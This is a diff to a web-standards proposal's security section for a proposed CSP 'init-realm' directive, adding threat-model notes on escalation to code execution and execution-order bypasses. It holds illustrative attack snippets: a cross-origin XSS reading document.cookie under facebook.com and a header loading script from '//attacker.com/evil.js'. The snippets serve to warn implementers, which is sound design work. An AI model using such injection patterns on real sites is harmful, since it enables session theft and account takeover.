@@ -261,12 +261,14 @@ Since the proposed CSP directive introduces a remote resource to be treated as J
 So if website `attacker.com` finds such a flaw in the implementation, they can easily initiate a Universal XSS against `facebook.com` by taking the following steps:
 
 ```html
-<!-- Content-Security-Policy: init-realm: /x.js -->
-<html location="//attacker.com">
 <script src="/x.js">
    // browser got tricked into running RIC script under a cross origin:
    alert(document.cookie); // will execute under facebook.com
 </script>
+
+<!-- Content-Security-Policy: init-realm: /x.js -->
+
+<html location="//attacker.com">
 <script>
    createAnIframeThatBypassesRIC({src: '//facebook.com'});
 </script>
@@ -277,9 +279,52 @@ Therefore, it is crucial to make sure that the check in which it is determined w
 
 While this sounds alarming, since this proposal advises to tap into existing places in which such information is safely determined, it is fair to believe this can be implemented safely just as well.
 
-#### 
+#### Escalation to Code Execution
 
-TODO MORE?
+From the perspective of an attacker, this proposal can also be thought of as a way to escalate a CSP directive set to full code execution, because of the attacker doesn't find a way to introduce an XSS to the web app, but can somehow control parts of the response's headers, they can translate such capability to an effective XSS using this proposal, by simply configuring a CSP header with the proposed `init-realm` directive pointing to a remote script they control:
+
+```html
+<!-- Content-Security-Policy: init-realm: //attacker.com/evil.js -->
+
+<html location="//example.com">
+</html>
+```
+
+Therefore, it might be important to make sure the address to the remote script resource introduced in the proposed `init-realm` directive properly obeys to other parts of CSP that have the power to mitigate it so attackers won't be able to load them by remote resources the control (e.g. `//attacker.com/evil.js`) nor local ones (e.g. `blob:https://web.app/aa14dc0d-c44c-4072-b918-bff92d26b9b7`):
+
+```html
+<!-- Content-Security-Policy: script-src: 'self'; init-realm: //attacker.com/evil.js -->
+
+<html location="//example.com">
+</html>
+```
+
+#### Integrity of Execution Order
+
+When implementing this proposal, it is crucial to correctly instruct the browser to check whether the scripts introduced via the proposed directive under each document actually loaded under it (and do so once if it turns out they didn't) the moment the document object was successfully constructed and is ready to start parsing HTML.
+
+Otherwise, a malicious entity can find a way to introduce their own JavaScript code to run before the `init-realm` script, which would count as a complete bypass of this feature effectively which would miss the goal entirely:
+
+```html
+<script src="/x.js">
+   // use RIC to disable "alert()"
+   window.alert = undefined;
+</script>
+
+<!-- Content-Security-Policy: script-src: 'self'; init-realm: /x.js -->
+
+<html location="//example.com">
+   <script name="evil">
+      let a = alert;
+      if (typeof a !== 'function') {
+         const ifr = createAnIframeThatBypassesRIC({src: 'about:blank'});
+         // next line counts on RIC not kicking in soon enough:
+         a = ifr.contentWindow.alert;
+      }
+      a('BYPASSED');
+   </script>
+</html>
+```
 
 ## Terminology
 
